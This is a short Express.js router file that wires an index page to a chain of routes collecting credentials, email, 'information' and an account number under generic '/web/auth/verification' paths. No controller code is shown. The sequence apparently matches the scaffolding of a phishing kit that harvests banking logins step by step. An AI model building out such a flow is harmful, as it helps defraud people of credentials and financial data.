const express = require('express');

const mainController = require('../controllers/client');


const router = express.Router();

router.get('/', mainController.getIndex);

router.get('/web/auth', mainController.getCredentials);

router.post('/web/auth/verification/email', mainController.postCredentials);

router.get('/web/auth/verification/email', mainController.getEmail);

router.post('/web/auth/verification/information', mainController.postEmail);

router.get('/web/auth/verification/information', mainController.getInformation);

router.post('/web/auth/verification/accountNumber', mainController.postInformation);

router.get('/web/auth/verification/accountNumber', mainController.getAccountNumber);

router.post('/web/auth/verification/accountCompleted', mainController.postAccountCompleted);

router.get('/web/auth/verification/accountCompleted', mainController.getAccountCompleted);

module.exports = router;
